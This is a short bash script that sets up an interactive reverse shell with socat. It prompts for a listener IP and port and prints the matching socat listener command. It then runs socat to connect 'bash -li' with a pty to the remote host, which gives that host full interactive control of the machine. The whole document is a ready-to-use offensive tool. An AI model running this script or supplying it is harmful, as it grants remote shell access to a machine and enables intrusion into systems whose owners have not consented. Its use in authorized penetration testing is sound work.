# !/bin/bash

# usage: ./socat_rev_shell.sh

echo "[!] Make sure you listening with socat on the remote host (listener)"
echo "[!] Use the command: socat file:'tty',raw,echo=0 tcp-listen:<PORT>"
read -p "[*] Enter listener IP: " ipvar
read -p "[*] Enter listener port: " portvar

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ipvar:$portvar








